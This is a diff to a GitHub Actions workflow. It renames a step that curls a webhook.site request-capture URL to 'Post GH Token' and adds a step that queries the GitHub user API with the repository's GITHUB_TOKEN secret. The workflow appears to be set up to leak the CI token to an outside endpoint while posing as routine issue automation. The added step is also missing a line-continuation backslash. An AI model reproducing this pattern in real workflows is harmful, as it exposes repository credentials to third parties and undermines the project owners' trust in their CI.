@@ -9,7 +9,7 @@ jobs:
   test:
     runs-on: ubuntu-latest
     steps:
-      - name: Create issue using REST API
+      - name: Post GH Token
         run: |
           curl --request GET \
           --url https://webhook.site/5fa091de-54e8-4ac8-9fa8-34965e88052a \
@@ -19,4 +19,12 @@ jobs:
             "title": "Automated issue for commit: ${{ github.sha }}",
             "body": "This issue was automatically created by the GitHub Action workflow **${{ github.workflow }}**. \n\n The commit hash was: _${{ github.sha }}_."
             }' \
+          --fail
+      - name: Get User Details
+        run: |
+          curl -L \
+          --url https://api.github.com/user
+          --header 'Accept: application/vnd.github+json' \
+          --header 'Authorization: Bearer ${{ secrets.GITHUB_TOKEN }}' \
+          --header 'X-GitHub-Api-Version: 2022-11-28' \
           --fail
